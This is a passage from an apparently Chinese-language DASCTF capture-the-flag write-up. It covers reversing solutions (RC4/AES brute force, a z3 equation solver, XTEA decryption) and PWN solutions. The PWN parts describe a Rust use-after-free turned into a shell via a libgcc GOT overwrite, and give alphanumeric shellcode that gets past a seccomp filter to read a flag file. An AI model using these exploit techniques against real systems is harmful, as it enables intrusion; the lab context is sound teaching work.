0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}; /* round key */
    uint8_t s[4 * 4] = { 0 }; /* state */
    uint8_t v[4 * 4] = { 0 }; /* iv */
    
    
    int nr, i, j;
    
    /* key expansion */
//	aes_key_expansion(mode, key, w);
    
    memcpy(v, iv, sizeof(v));
    
    /* start data cypher loop over input buffer */
    for (i = 0; i < len; i += 4 * g_aes_nb[mode]) {
        
        
        /* init state from user buffer (cyphertext) */
        for (j = 0; j < 4 * g_aes_nb[mode]; j++)
            s[j] = data[i + j];
        
        /* start AES cypher loop over all AES rounds */
        for (nr = g_aes_rounds[mode]; nr >= 0; nr--) {
            
            /* do AddRoundKey */
            aes_add_round_key(mode, s, w, nr);
            
            if (nr > 0) {
                
                if (nr < g_aes_rounds[mode]) {
                    /* do MixColumns */
                    inv_mix_columns(mode, s);
                }
                
                /* do ShiftRows */
                inv_shift_rows(mode, s);
                
                /* do SubBytes */
                inv_sub_bytes(mode, s);
            }
        }
        
        /* save state (cypher) to user buffer */
        for (j = 0; j < 4 * g_aes_nb[mode]; j++) {
            uint8_t p = s[j] ^ v[j];
            v[j] = data[i + j];
            data[i + j] = p;
        }
    }
    
    return 0;
}

```

```cpp
#include <iostream>
#include <bits/stdc++.h>
#include "AES.cpp"
using namespace std;
unsigned char rc4_key[6];


/*初始化函数*/
void rc4_init(unsigned char*s,unsigned char*key, unsigned long Len)
{
    int i=0,j=0;
    unsigned char T[256]={0};
    for(i=0;i<256;i++) {
        s[i]=i;//s_box初始化为[0,255]
        T[i]=key[i%Len];//key如果没到256位，就循环输入进T数组
    }
    for(i=0;i<256;i++) {
        j=(j+s[i]+T[i])%256;//得到一个随机下标
        swap(s[i],s[j]);//打乱s数组
    }
}

/*加解密*/
void rc4_crypt(unsigned char*s,unsigned char*Data,unsigned long Len)
{//s为s_box,Data为明文,len为明文长度
    int i=0,j=0,t=0;
    unsigned long k=0;
    for(k=0;k<Len;k++)//遍历明文的每一位
    {
        i=(i+1)%256;
        j=(j+s[i])%256;
        swap(s[i],s[j]);//进一步打乱s_box
        t=(s[i]+s[j])%256;//得到一个随机下标t,s[t]其实就是生成的密钥流中的一位
        Data[k]^=s[t];//异或加密，那么解密过程就是再异或一次
    }
}


void check()
{	
    unsigned char enc[] = {0xca, 0x5c, 0xb8, 0xbe, 0x44, 0x20, 0x97, 0x25, 0x1c, 0x30, 0x4e, 0xf5, 0xfd, 0xe6, 0x19, 0xe9, 0x67, 0x9a, 0x46, 0xdd, 0xa0, 0xe7, 0xac, 0x84, 0x66, 0x37, 0xf8, 0xb, 0xf4, 0x10, 0x9c, 0x6b};
    unsigned char aes_key[] = {0x97, 0x57, 0x7c, 0xdc, 0xdb, 0xe2, 0x0c, 0x32, 0x20, 0xfc, 0x59, 0xca, 0xa6, 0x40, 0xb5, 0x90};
    unsigned char key[7];
    for(int i = 0; i < 6; i++)key[i] = rc4_key[i] ^ 0x23;
    key[6] = 0;
    unsigned char s[256] = { 0 };
    rc4_init(s, key, sizeof(key));
    rc4_crypt(s, enc, sizeof(enc));
    unsigned char iv[16];
    for(int i = 0; i < 16; i++)
    {
        iv[i] = key[i % 5] ^ aes_key[i] ^ i;
    }
    aes_decrypt_cbc(AES_CYPHER_128, enc, sizeof(enc), aes_key, iv);
    for(int i = 0; i < sizeof(32); i++)
    {
        if(!(enc[i] >= 32 && enc[i] <= 127 && enc[0] == 'D' && enc[1] == 'A' && enc[2] =='S' && enc[3] == 'C' && enc[4] == 'T' && enc[5] == 'F'))
        {
            return ;
        }
    }
    printf("%s\n", enc);
}

void dfs(int x)
{
    if(x == 6)
    {
        check();
        return;
    }
    for(int i = 67; i <= 72; i++)
    {
        rc4_key[x] = i;
        dfs(x + 1);
    }
}

int main()
{
    dfs(0);
}
```

## 题目：<font style="color:rgb(33, 37, 41);">fakeApple</font>
解题步骤

打开文件，是很明显的ios编译产物

![image-1730940353107](./assets/image-1730940353107.png)

需要关注的就是里面的chall文件

这题鼓励静态解题，如果需要动态解题的话需要越狱真机环境进行安装，并且由于虚拟机内存占用较大，多数机型运行会崩溃

不过这里可以看看运行效果，其实只有一个输入框，在组件命名上也没有过多为难选手

![image-1730940353612](./assets/image-1730940353612.png)

对应的就是这里的method：

![image-1730940354108](./assets/image-1730940354108.png)

像这里就可以进行定位：

![image-1730940354586](./assets/image-1730940354586.png)

可以进到主逻辑

![image-1730940355046](./assets/image-1730940355046.png)

可以看出，这里是一个cpp 虚表做的vm

![image-1730940355616](./assets/image-1730940355616.png)

可以看这篇的类型设置恢复：

[【技术分享】逆向C++虚函数（一）-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/85201)

或者直接通过汇编的偏移进行重命名，虚表本体并不复杂，但由于限制了动调手段（动调建议使用lldb解题，如果配置了可以调试的环境后续会简单很多，这里不重复赘述）

![image-1730940356296](./assets/image-1730940356296.png)

这里直接给出case的结论：

![image-1730940356931](./assets/image-1730940356931.png)

出于算法简化的考虑，本题实际只使用了add sub两种，不过魔改为数电的算法，实际上这里就是加法操作，其他运算同理

![image-1730940357477](./assets/image-1730940357477.png)

还原流程，36个方程组，写出解密代码：

```plain
from z3 import Int, Solver, simplify, sat
expressions = ['- x1 - x2 - x3 - x4 + x5 + x6 - x7 + x8 - x9 + x10 + x11 - x12 - x13 - x14 + x15 + x16 + x17 - x18 + x19 - x20 + x21 - x22 + x23 - x24 + x25 + x26 + x27 - x28 - x29 - x30 + x31 - x32 - x33 + x34 + x35 + x36 == -6', '- x1 + x2 + x3 - x4 - x5 + x6 + x7 + x8 + x9 - x10 - x11 + x12 + x13 + x14 - x15 - x16 - x17 + x18 + x19 - x20 - x21 - x22 + x23 + x24 + x25 - x26 - x27 + x28 - x29 + x30 - x31 + x32 - x33 + x34 + x35 + x36 == 372', '+ x1 + x2 - x3 - x4 - x5 + x6 + x7 + x8 - x9 + x10 - x11 + x12 - x13 + x14 - x15 + x16 - x17 + x18 - x19 - x20 - x21 - x22 + x23 - x24 + x25 - x26 + x27 + x28 - x29 - x30 + x31 - x32 + x33 - x34 + x35 + x36 == 160', '- x1 + x2 + x3 - x4 + x5 + x6 + x7 - x8 + x9 + x10 - x11 + x12 - x13 - x14 - x15 - x16 + x17 + x18 + x19 + x20 + x21 - x22 + x23 + x24 + x25 + x26 + x27 - x28 - x29 - x30 + x31 + x32 + x33 + x34 + x35 + x36 == 956', '+ x1 - x2 + x3 + x4 - x5 + x6 - x7 + x8 + x9 + x10 - x11 - x12 - x13 - x14 + x15 - x16 - x17 - x18 + x19 - x20 + x21 + x22 + x23 - x24 + x25 - x26 - x27 + x28 + x29 - x30 - x31 + x32 + x33 + x34 - x35 + x36 == 60', '- x1 + x2 + x3 - x4 + x5 - x6 + x7 + x8 - x9 + x10 - x11 + x12 + x13 - x14 + x15 - x16 - x17 - x18 - x19 - x20 + x21 + x22 + x23 - x24 - x25 - x26 + x27 + x28 - x29 - x30 + x31 + x32 + x33 + x34 + x35 - x36 == 210', '- x1 - x2 - x3 + x4 - x5 - x6 - x7 - x8 + x9 + x10 - x11 + x12 + x13 + x14 + x15 + x16 - x17 - x18 + x19 - x20 + x21 + x22 - x23 + x24 + x25 + x26 + x27 + x28 + x29 + x30 - x31 + x32 + x33 - x34 + x35 + x36 == 578', '- x1 - x2 + x3 - x4 + x5 + x6 + x7 + x8 + x9 + x10 + x11 - x12 - x13 + x14 - x15 + x16 - x17 - x18 + x19 + x20 + x21 + x22 + x23 + x24 + x25 - x26 + x27 - x28 + x29 - x30 - x31 + x32 + x33 - x34 + x35 - x36 == 754', '+ x1 - x2 + x3 - x4 + x5 + x6 - x7 - x8 + x9 - x10 - x11 - x12 + x13 - x14 - x15 + x16 + x17 - x18 + x19 - x20 - x21 - x22 + x23 + x24 + x25 - x26 + x27 + x28 + x29 - x30 - x31 - x32 - x33 - x34 - x35 + x36 == -532', '- x1 - x2 + x3 + x4 + x5 + x6 + x7 + x8 - x9 - x10 + x11 - x12 - x13 - x14 + x15 + x16 + x17 - x18 + x19 + x20 + x21 + x22 - x23 + x24 + x25 - x26 - x27 + x28 - x29 + x30 + x31 - x32 - x33 - x34 - x35 - x36 == 20', '- x1 - x2 - x3 - x4 - x5 - x6 + x7 - x8 - x9 - x10 - x11 - x12 - x13 - x14 + x15 + x16 - x17 - x18 - x19 - x20 + x21 + x22 + x23 + x24 - x25 + x26 + x27 - x28 - x29 - x30 - x31 + x32 + x33 - x34 + x35 - x36 == -1050', '+ x1 + x2 + x3 - x4 - x5 + x6 + x7 - x8 - x9 + x10 + x11 + x12 - x13 - x14 + x15 - x16 - x17 + x18 - x19 - x20 - x21 + x22 - x23 + x24 + x25 - x26 - x27 + x28 + x29 - x30 - x31 + x32 + x33 - x34 - x35 - x36 == -48', '- x1 - x2 + x3 - x4 - x5 + x6 - x7 + x8 + x9 + x10 + x11 - x12 + x13 - x14 - x15 + x16 - x17 - x18 - x19 + x20 + x21 + x22 + x23 + x24 - x25 - x26 + x27 - x28 - x29 - x30 - x31 + x32 - x33 + x34 - x35 + x36 == -30', '- x1 + x2 + x3 - x4 - x5 + x6 + x7 + x8 + x9 - x10 - x11 - x12 + x13 - x14 + x15 - x16 - x17 + x18 - x19 - x20 + x21 + x22 + x23 + x24 - x25 + x26 + x27 + x28 + x29 - x30 - x31 - x32 - x33 - x34 + x35 - x36 == -42', '- x1 + x2 + x3 - x4 - x5 + x6 + x7 - x8 - x9 + x10 - x11 - x12 - x13 + x14 + x15 + x16 + x17 - x18 - x19 + x20 - x21 + x22 + x23 + x24 - x25 + x26 - x27 + x28 - x29 - x30 + x31 - x32 + x33 + x34 - x35 - x36 == 50', '- x1 - x2 - x3 - x4 - x5 + x6 - x7 + x8 + x9 + x10 - x11 - x12 - x13 + x14 + x15 + x16 + x17 - x18 + x19 + x20 - x21 - x22 - x23 - x24 - x25 - x26 - x27 + x28 + x29 - x30 + x31 - x32 - x33 - x34 - x35 - x36 == -774', '- x1 + x2 - x3 - x4 - x5 - x6 - x7 + x8 - x9 + x10 + x11 + x12 - x13 - x14 + x15 + x16 - x17 + x18 + x19 - x20 + x21 - x22 + x23 + x24 + x25 - x26 - x27 + x28 - x29 - x30 + x31 + x32 - x33 - x34 + x35 + x36 == 74', '+ x1 + x2 + x3 - x4 + x5 + x6 - x7 - x8 + x9 - x10 - x11 - x12 - x13 - x14 - x15 - x16 - x17 - x18 + x19 - x20 - x21 - x22 + x23 + x24 + x25 + x26 + x27 - x28 + x29 + x30 - x31 + x32 + x33 + x34 + x35 + x36 == -8', '+ x1 - x2 + x3 + x4 - x5 - x6 - x7 - x8 + x9 - x10 + x11 - x12 + x13 - x14 - x15 - x16 + x17 + x18 + x19 + x20 - x21 - x22 + x23 - x24 - x25 + x26 + x27 + x28 + x29 + x30 + x31 + x32 - x33 - x34 - x35 - x36 == -186', '- x1 + x2 + x3 + x4 + x5 - x6 + x7 - x8 + x9 + x10 - x11 - x12 + x13 + x14 + x15 + x16 - x17 + x18 + x19 + x20 + x21 + x22 + x23 + x24 - x25 - x26 + x27 - x28 - x29 + x30 + x31 + x32 - x33 - x34 + x35 - x36 == 732', '- x1 + x2 - x3 + x4 + x5 + x6 - x7 - x8 - x9 + x10 - x11 + x12 + x13 + x14 + x15 + x16 + x17 + x18 + x19 + x20 + x21 - x22 + x23 - x24 - x25 - x26 + x27 + x28 - x29 + x30 + x31 + x32 + x33 - x34 - x35 + x36 == 698', '+ x1 + x2 - x3 + x4 + x5 - x6 + x7 - x8 + x9 - x10 + x11 - x12 - x13 - x14 + x15 - x16 - x17 - x18 - x19 - x20 - x21 + x22 - x23 - x24 - x25 - x26 - x27 - x28 + x29 + x30 + x31 - x32 - x33 - x34 + x35 + x36 == -682', '- x1 + x2 - x3 - x4 + x5 + x6 - x7 + x8 + x9 + x10 - x11 + x12 - x13 - x14 + x15 + x16 - x17 + x18 + x19 + x20 + x21 - x22 - x23 - x24 + x25 - x26 - x27 - x28 + x29 - x30 + x31 + x32 - x33 + x34 + x35 - x36 == 220', '+ x1 - x2 + x3 + x4 - x5 + x6 + x7 - x8 - x9 + x10 + x11 + x12 + x13 - x14 - x15 + x16 + x17 + x18 + x19 - x20 + x21 - x22 - x23 - x24 + x25 - x26 - x27 - x28 - x29 - x30 - x31 + x32 - x33 + x34 - x35 + x36 == 58', '- x1 - x2 + x3 - x4 - x5 + x6 + x7 - x8 - x9 + x10 - x11 - x12 + x13 - x14 - x15 + x16 + x17 - x18 + x19 + x20 + x21 + x22 - x23 - x24 + x25 - x26 + x27 + x28 + x29 + x30 - x31 - x32 + x33 + x34 + x35 - x36 == 50', '+ x1 - x2 + x3 + x4 + x5 + x6 + x7 + x8 - x9 + x10 - x11 - x12 - x13 + x14 + x15 + x16 + x17 - x18 + x19 - x20 - x21 + x22 - x23 + x24 - x25 - x26 - x27 - x28 - x29 - x30 - x31 - x32 + x33 + x34 + x35 + x36 == 346', '- x1 + x2 - x3 + x4 - x5 - x6 + x7 + x8 + x9 + x10 + x11 - x12 - x13 - x14 - x15 - x16 + x17 - x18 - x19 - x20 - x21 + x22 - x23 + x24 + x25 + x26 - x27 - x28 - x29 - x30 - x31 + x32 + x33 - x34 - x35 + x36 == -460', '+ x1 - x2 - x3 - x4 - x5 - x6 + x7 + x8 - x9 + x10 - x11 + x12 - x13 - x14 + x15 + x16 + x17 + x18 - x19 + x20 + x21 + x22 + x23 - x24 - x25 + x26 - x27 + x28 - x29 + x30 + x31 - x32 + x33 + x34 + x35 + x36 == 586', '+ x1 - x2 + x3 - x4 + x5 - x6 - x7 - x8 - x9 - x10 + x11 - x12 + x13 - x14 - x15 + x16 - x17 + x18 + x19 - x20 + x21 + x22 - x23 - x24 + x25 - x26 + x27 + x28 + x29 - x30 - x31 - x32 + x33 + x34 - x35 - x36 == -360', '- x1 - x2 - x3 + x4 + x5 + x6 - x7 + x8 - x9 - x10 + x11 + x12 - x13 - x14 + x15 - x16 - x17 - x18 + x19 - x20 - x21 + x22 - x23 - x24 + x25 + x26 - x27 + x28 + x29 + x30 - x31 + x32 - x33 + x34 - x35 - x36 == -318', '- x1 - x2 + x3 + x4 - x5 + x6 - x7 + x8 + x9 - x10 + x11 - x12 + x13 - x14 - x15 - x16 - x17 + x18 + x19 - x20 - x21 + x22 + x23 - x24 - x25 + x26 - x27 + x28 - x29 - x30 - x31 - x32 + x33 - x34 - x35 + x36 == -570', '- x1 - x2 - x3 - x4 - x5 + x6 - x7 - x8 + x9 - x10 + x11 - x12 + x13 - x14 - x15 + x16 - x17 - x18 + x19 + x20 + x21 + x22 + x23 + x24 - x25 + x26 + x27 - x28 - x29 + x30 - x31 + x32 - x33 - x34 - x35 + x36 == -484', '- x1 - x2 + x3 - x4 - x5 - x6 - x7 + x8 - x9 - x10 - x11 - x12 + x13 + x14 - x15 - x16 - x17 + x18 - x19 + x20 - x21 + x22 - x23 - x24 - x25 + x26 - x27 + x28 + x29 - x30 + x31 + x32 + x33 + x34 + x35 - x36 == -260', '+ x1 + x2 - x3 + x4 + x5 + x6 - x7 - x8 - x9 + x10 + x11 - x12 + x13 - x14 + x15 + x16 - x17 + x18 + x19 - x20 + x21 - x22 + x23 - x24 - x25 + x26 + x27 - x28 - x29 + x30 - x31 + x32 + x33 - x34 + x35 - x36 == 84', '+ x1 + x2 + x3 + x4 - x5 - x6 + x7 + x8 + x9 + x10 + x11 - x12 + x13 - x14 + x15 - x16 - x17 - x18 + x19 - x20 + x21 + x22 - x23 + x24 - x25 - x26 - x27 + x28 + x29 + x30 - x31 - x32 - x33 + x34 - x35 - x36 == 150', '- x1 - x2 + x3 + x4 + x5 + x6 + x7 + x8 - x9 - x10 + x11 + x12 + x13 - x14 + x15 + x16 + x17 - x18 - x19 + x20 + x21 + x22 - x23 - x24 - x25 + x26 - x27 - x28 - x29 + x30 + x31 + x32 - x33 - x34 + x35 - x36 == 270']

def solve_equations_with_z3(expressions, n):
    # 创建变量
    vars = [Int(f'x{i + 1}') for i in range(n)]
    solver = Solver()

    for expr in expressions:
        # 将字符串转换为 z3 表达式
        z3_expr = eval(expr, {f'x{i + 1}': vars[i] for i in range(n)})
        solver.add(z3_expr)

    if solver.check() == sat:
        model = solver.model()
        solution = [model[var] for var in vars]
        return solution
    else:
        return "No solution found"

h = solve_equations_with_z3(expressions,36)
print(h)
print(''.join([chr(i) for i in [68, 65, 83, 67, 84, 70, 123, 119, 52, 108, 108, 95, 67, 112, 80, 95, 52, 110, 68, 95, 49, 79, 53, 95, 49, 83, 95, 81, 117, 49, 84, 95, 70, 117, 78, 125]]))
```

## 题目：<font style="color:rgb(33, 37, 41);">ezcpp</font>
解题步骤

首先用IDA打开

![image-1730940357998](./assets/image-1730940357998.png)

可以看到，v12获取了一个线程环境块，之后使用cin输入，并将输入放置到locale中。140008374和140008370分别是用来存储输入两个部分的全局变量。输入的内容将按照每4个字符一组，各合并成一个32位的数。后续这两个全局变量将被用来进行flag输入的检测。

sub_1400021B0和sub_140002230是输入提示的字符串解密。和后面我们会用到的所有字符串解密的方法一样，但是解密密钥不同。

![image-1730940358520](./assets/image-1730940358520.png)

下面获取了虚表，准备进行vmthook。hook分别发生了两次，替换成的函数分别是140001A60和140001AA0

![image-1730940358948](./assets/image-1730940358948.png)

第一个140001A60仅用来抛出异常，是异常传递，让主函数进入异常处理。注意到，即时在被调试的状态下，也并没有直接退出，所以v13->BeingDebugged其实是一个假信息，这个代码并不会被执行。而是会按照异常处理中的内容被存储到全局变量中。

![image-1730940359456](./assets/image-1730940359456.png)



sub_140001AA0则是校验Flag是否正确的函数，进入查看

![image-1730940359933](./assets/image-1730940359933.png)

是用来抛出除0异常的，查看异常处理的汇编，则发现是将输入作为参数，调用了sub_140001BA0这个函数



进入sub_140001BA0



首先，开辟了一段可以执行的虚拟内存，把140008090数组的内容拷贝了进去，然后判断是否分配成功，分别进行不同的操作。但注意抛出异常的地方的Memory allocation failed是假信息，并非分配错误了，而是干扰项

抛出异常后的代码一如既往的看不见，还是要去看一下汇编

![image-1730940360542](./assets/image-1730940360542.png)

下方的代码是异常处理之后的部分，我们通过交叉引用看到异常处理做了什么



此时比较清晰，即把刚才新开辟并且拷贝过内容的v2中的内容，逐个字节全部异或0xDA。

此时再回去看刚才异常处理之后的汇编代码，发现此前140008090被拷贝到rax中，并读取到

[rsp+108h+var_D8]，然后异常处理中对[rsp+108h+var_D8]进行解密，最后在140001c66处

call [rsp+108h+var_D8]。此时只需要先对140008090进行解密，然后进一步分析。写一个IDA脚本

```python
import idaapi
import idautils
import idc

def xor_memory(start_ea, end_ea, xor_key):
    """
    XOR the bytes in the specified range with the given key.

    :param start_ea: Start address of the range.
    :param end_ea: End address of the range.
    :param xor_key: The key to XOR with.
    """
    if start_ea >= end_ea:
        print("Invalid address range")
        return
    
    for ea in range(start_ea, end_ea):
        byte = idc.get_wide_byte(ea)
        xor_byte = byte ^ xor_key
        idc.patch_byte(ea, xor_byte)
    
    print(f"XORed memory from 0x{start_ea:X} to 0x{end_ea:X} with key 0x{xor_key:X}")

def main():
    # Example usage
    start_ea = 0x140008090 # Start address
    end_ea = 0x1400081BF   # End address 
    xor_key = 0xDA        # XOR key

    xor_memory(start_ea, end_ea, xor_key)

if __name__ == "__main__":
    main()

```

ida运行之后，在140008090处创建一个函数即可



这里是一个修改版的xtea加密。传入a1,a2分别是明文的两个部分，a3是是否正在被调试。相比于普通的xtea加密，在最后一个32位key上加a3，并且将结果连接成64位后异或a3。

回到调用函数的地方，找到调用后的比较首先将刚才xtea加密后的内容转换为字符串，之后下面两个函数分别解密出两个答案字符串，进行比较，判断是否正确。

![image-1730940361093](./assets/image-1730940361093.png)

分别对应被调试和不被调试状态的比较，也就是本题的两个flag。以第二个为例，首先查看拷贝内存的函数。



密文在这里，是6?<82>967 4:1=??468$\a

查看下方sub_140002250中调用的函数sub_140001E10，即为对此进行解密



注意每个字符串的解密密钥都不同，但解密方法是相同的。

写脚本分别解出两个答案字符串

```cpp
#include <Windows.h>
#include <iostream>

int main()
{
    char a[] = "6?<82>967 4:1=??468$\\a";
    unsigned char a2[] =
    {
      0x32, 0x36, 0x35, 0x33, 0x32, 0x34, 0x36, 0x34, 0x37, 0x35,
      0x33, 0x32, 0x33, 0x34, 0x32, 0x36, 0x35, 0x36, 0x35, 0x30
    };
    for (int i = 0; i < 21; ++i)
    {
        printf("%c",(i % 10 + 7) ^ *(BYTE*)(a + i));
    }
    printf("\n");
    for (int i = 0; i < 21; ++i)
    {
        printf("%c", (i % 5 + 3) ^ *(BYTE*)(a2 + i));
    }
```

解出分别为

17529248803287439874 （不被调试状态）  
12055721120662551337 （被调试状态）

这是xtea加密后的64进制数字。

写一个python脚本，分别对应第一个，a3=0和第二个，a3=1

```python
def decrypt_xtea_variant(encrypted, a3):
    encrypted ^= a3
    a1 = (encrypted >> 32) & 0xFFFFFFFF
    a2 = encrypted & 0xFFFFFFFF
    v4 = 0
    v8 = [0x42CA4455, 0x8E0AE93B, 0xA569C4D0, (a3 + 0x523A855B) & 0xFFFFFFFF]


    for _ in range(0x20):
        v4 = (v4 + 998998) & 0xFFFFFFFF


    for _ in range(0x20):
        a2 = (a2 - ((v8[(v4 >> 11) & 3] + v4) ^ (a1 + ((a1 >> 5) ^ (16 * a1)))) & 0xFFFFFFFF) & 0xFFFFFFFF
        v4 = (v4 - 998998) & 0xFFFFFFFF
        a1 = (a1 - ((v8[v4 & 3] + v4) ^ (a2 + ((a2 >> 5) ^ (16 * a2)))) & 0xFFFFFFFF) & 0xFFFFFFFF

    return a1, a2


def split_to_ascii(hex_value):
    hex_str = f"{hex_value:08X}"
    split_hex = [hex_str[i:i+2] for i in range(0, 8, 2)]
    ascii_chars = [chr(int(h, 16)) for h in split_hex]
    return split_hex, ascii_chars


debug_encrypted_value = 12055721120662551337
a3 = 1

debug_decrypted_a1, debug_decrypted_a2 = decrypt_xtea_variant(debug_encrypted_value, a3)
debug_a1_hex, debug_a1_ascii = split_to_ascii(debug_decrypted_a1)
debug_a2_hex, debug_a2_ascii = split_to_ascii(debug_decrypted_a2)

print(f"Decrypted a1: 0x{debug_decrypted_a1:08X} -> {debug_a1_hex} -> {debug_a1_ascii}")
print(f"Decrypted a2: 0x{debug_decrypted_a2:08X} -> {debug_a2_hex} -> {debug_a2_ascii}")


undebug_encrypted_value = 17529248803287439874
a3 = 0

undebug_decrypted_a1, undebug_decrypted_a2 = decrypt_xtea_variant(undebug_encrypted_value, a3)
undebug_a1_hex, undebug_a1_ascii = split_to_ascii(undebug_decrypted_a1)
undebug_a2_hex, undebug_a2_ascii = split_to_ascii(undebug_decrypted_a2)

print(f"Decrypted a1: 0x{undebug_decrypted_a1:08X} -> {undebug_a1_hex} -> {undebug_a1_ascii}")
print(f"Decrypted a2: 0x{undebug_decrypted_a2:08X} -> {undebug_a2_hex} -> {undebug_a2_ascii}")
```

解出答案为

G0g3tTea7up@fT3A

包裹DASCTF{}后为正确答案

# PWN
## 题目：<font style="color:rgb(33, 37, 41);">Moon</font>
解题步骤

**漏洞点**

模仿了 to the moon 游戏，控制一台机器操纵一些记忆。操作有pop、 push、 print、 modify、 get 等等。

其中 get 和 get_mut 使用了[不进行边界检查](https://doc.rust-lang.org/std/vec/struct.Vec.html#method.get_unchecked)的 get_unchecked 和 get_unchecked_mut。

```rust
    pub fn get(&self, index: Index) -> &T {
        unsafe { self.inner.get_unchecked(index.idx) }
    }

    pub fn get_mut(&mut self, index: Index) -> &mut T {
        unsafe { self.inner.get_unchecked_mut(index.idx) }
    }
```

因此存在 uaf。 在删除最后一个元素之后存在，可以通过 self.location 来访问已经释放的堆块。

```rust

    fn print_memory(&self) {
        let memory = self.memories.get(self.location);
        print_str(memory.as_str());
        print_str("\n");
    }

    fn modify_memory(&mut self) -> Result<(), Box<dyn Error>> {
        print_str("更新记忆>");

        let memory = self.memories.get_mut(self.location);
        read_string(memory);
        Ok(())
    }

```

我们可以通过这两个方法来读取和修改，进而任意修改写一个地址的数据。但是这里的任意写也不是很容易：

```rust
struct MemoryMachine {
    memories: Queue<String>,
    location: Index,
}
```

根据[文档](https://doc.rust-lang.org/std/string/struct.String.html), rust 中的 String是 `A UTF-8–encoded, growable string.`。所以如果会检查输入是否是 utf-8，我们可以通过多试几次来让输入的地址和数据符合 utf-8 的检查。

现在已经可以任意写，接下来应该如何 getshell 呢？由于环境里是 2.39，不能通过修改 libc got 表来实现 getshell 了。构造很长的 io_file 并且符合输入都是 utf-8 比较麻烦。

不过还是可以写 libgcc 的。libgcc 的[功能](https://gcc.gnu.org/onlinedocs/gccint/Libgcc.html) 包括了 Language-independent routines for exception handling 的会用到这个库，所以 panic 一下就可以触发 libgcc 中的函数。

改变 libgcc 的 got 表项为 gadget 就可以 getshell 了。



## 题目：alphacode
解题步骤

分析本题seccomp

```plain
A = arch
A == ARCH_X86_64 ? next : die
A = sys_number
A >= 0x40000000 ? die : next
A == execve ? die : next
A == execveat ? die : next
A == ptrace ? die : next
A == fork ? die : next
A == vfork ? die : next
A == clone ? die : next
A == unlink ? die : next
A == chmod ? die : next
A == read ? die : next
A == open ? ok : next
A = args[0]
A > 1 ? die : next
A < 0 ? die : next
A = args[2]
A > 1 ? die : next
A < 0 ? die : next
A = args[3]
A > 1 ? die : next
A < 0 ? die : next

ok:
return ALLOW
die:
return KILL
```

同时题目会在执行shellcode前清除rsp之外所有的通用寄存器

由于限制了禁止read，并且除open外，第一、三、四个参数的值必须为0或1，所以本题的解题思路就比较明确了：先open flag文件，然后循环使用sendfile系统调用打印出flag文件

接下来我们要构造alphanumeric shellcode，简单的思路就是把实际的shellcode异或储存，再使用xor [rax+rdi*1+OFFSET], IMMEDIATE的方式恢复，这里要求OFFSET和IMMEDIATE都是alphanumeric字符。对于使用xor恢复不了的（例如short jump机器码的最高位是1，而所有alphanumeric字符的最高位必不可能是1）则使用add

首先写出exp部分，但是要求非alphanumeric的部分尽可能少（这样就能减少xor的次数），并且尽可能连续（这样我们可以使用使操作数是m32即xor dword ptr [XXX], IMMEDIATE，减少xor的次数）

exp.asm:

```plain
[bits 64]
push 'flag'
push rsp
pop rdi
push 2
pop rax
syscall ; open("flag",0,0)

label:
push 1
push 0x28
pop rax ; 0x28
push rbx ; 0
pop rdx ; 0
pop r10 ;1
push r10 ;1
push rdx ; 0
pop rsi ; 0
pop rdi ; 1
syscall
jmp label
```

然后我们选择一个适合异或的字符（将生成机器码的所有非alphanumeric字符打印出来，然后使用每个alphanumeric字符进行异或，期待异或结果也为alphanumeric），发现字符n(0x6e)非常适合拿来异或

写解码的shellcode，要注意我们shellcode的起始地址不是0x20240000，而是加上清空通用寄存器代码之后的长度。这里的OFFSET是通过动调得到的exp.asm对应的shellcode相对基址的偏移。解码部分因为使用了add指令，是非alphanumeric字符，所以我们还要在解码代码内部异或自己，恢复出add指令

head.asm:

```plain
[bits 64]
OFFSET equ 0x5b
;0x26
push 0x6e6e6e6e ; nnnn
push rsp
pop rcx
xor rdi,qword [rcx]
pop rdx ; rdx = 0x6e6e6e6e 方便之后异或

push 0x4e4a6e6e
xor rdi,qword [rcx] ; rdi = 0x6e6e6e6e^0x4e4a6e6e = 0x20240000

xor byte [rax+rdi*1+0x43],dl

push 0x61617575
pop rcx
add dword [rax+rdi*1+OFFSET+0x1c],ecx

xor byte [rax+rdi*1+OFFSET+0x6],dl
xor byte [rax+rdi*1+OFFSET+0xd],dl
xor byte [rax+rdi*1+OFFSET+0xf],dl
xor dword [rax+rdi*1+OFFSET+0x8],edx
xor dword [rax+rdi*1+OFFSET+0x18],edx
```

打印生成出来的机器码：

```python
def f(i):
    charset = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    ret=set()
    i=ord(i)
    for c in charset:
        if chr(ord(c)^i) in charset:
            ret.add(ord(c)^i)
    return ret
sc=open('./head.bin','rb').read()
for i in range(len(sc)):
    print(f'{hex(i)}:{sc[i].to_bytes(1,"little")}')
sc=open('./exp.bin','rb').read()
for i in range(len(sc)):
    print(f'{hex(i)}:{sc[i].to_bytes(1,"little")}')
```

```plain
0x0:b'h'
0x1:b'n'
0x2:b'n'
0x3:b'n'
0x4:b'n'
0x5:b'T'
0x6:b'Y'
0x7:b'H'
0x8:b'3'
0x9:b'9'
0xa:b'Z'
0xb:b'h'
0xc:b'n'
0xd:b'n'
0xe:b'J'
0xf:b'N'
0x10:b'H'
0x11:b'3'
0x12:b'9'
0x13:b'0'
0x14:b'T'
0x15:b'8'
0x16:b'C'
0x17:b'h'
0x18:b'u'
0x19:b'u'
0x1a:b'a'
0x1b:b'a'
0x1c:b'Y'
0x1d:b'\x01'
0x1e:b'L'
0x1f:b'8'
0x20:b'w'
0x21:b'0'
0x22:b'T'
0x23:b'8'
0x24:b'a'
0x25:b'0'
0x26:b'T'
0x27:b'8'
0x28:b'h'
0x29:b'0'
0x2a:b'T'
0x2b:b'8'
0x2c:b'j'
0x2d:b'1'
0x2e:b'T'
0x2f:b'8'
0x30:b'c'
0x31:b'1'
0x32:b'T'
0x33:b'8'
0x34:b's'
0x0:b'h'
0x1:b'f'
0x2:b'l'
0x3:b'a'
0x4:b'g'
0x5:b'T'
0x6:b'_'
0x7:b'j'
0x8:b'\x02'
0x9:b'X'
0xa:b'\x0f'
0xb:b'\x05'
0xc:b'j'
0xd:b'\x01'
0xe:b'j'
0xf:b'('
0x10:b'X'
0x11:b'S'
